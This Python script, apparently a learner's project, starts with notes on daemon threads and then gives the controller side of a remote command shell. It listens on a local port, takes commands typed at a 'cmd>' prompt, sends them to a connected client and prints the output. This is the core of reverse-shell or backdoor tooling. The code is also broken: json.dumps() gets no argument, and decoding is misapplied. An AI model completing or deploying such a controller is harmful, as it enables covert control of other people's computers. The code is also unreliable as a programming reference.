""" 
MAIN PROGRAM = CHILD THREAD  +  MAIN THREAD

Child threads = daemon and non-daemon(default)

eg:
  in a proram:
    * 1 main thread is there and 4 extra chreads
    * so these 4 threads are non-daemon threads by default.
    * main thread is also a kind of non-daemon thread
  * We need to create daemon thread separately.
  * when the main thread and all non-daemon threads are finished in the program, the daemon threads will be ended automatically even if the work of daemon thread is still pending.
"""


#imports and dependencies
import os
import sys
import socket
import threading
import subprocess
import json

def cmd_send(sock_fd, cmd):
    cmd = json.dumps()
    cmd = cmd.encode()
    sock_fd.send(cmd)

def cmd_recv(sock_fd):
    data = ''
    while True:
        data = data + sock_fd.recv(1024).decode()
        try:
            data = data.loads(data)
            return data
        except:
            continue

# main function for listening for connection from client and sending data


def main():
    HOST = "127.0.0.1"  # IP address
    PORT = 1234  # Port no. to listen on
    s = socket.socket()
    s.bind((HOST, PORT))
    s.listen(1)
    print("[+] Listining...")
    sock_fd, conn_addr = s.accept()
    # thorugh sock_fd -- connection will occur and conn_addr will tell from where the connection is coming
    if (conn_addr):
        print("[+] new connection:", conn_addr)
        while True:
            cmd = input("cmd> ")
            cmd_send(sock_fd, cmd)
            # sock_fd.send(cmd.encode())#dont need this line as we are calling the send function
            # res = sock_fd.recv(1024) #dont need this line as we are calling the recv function
            res = cmd_recv(sock_fd)
            print(res.decode())
    sock_fd.close()
    s.close()


main()
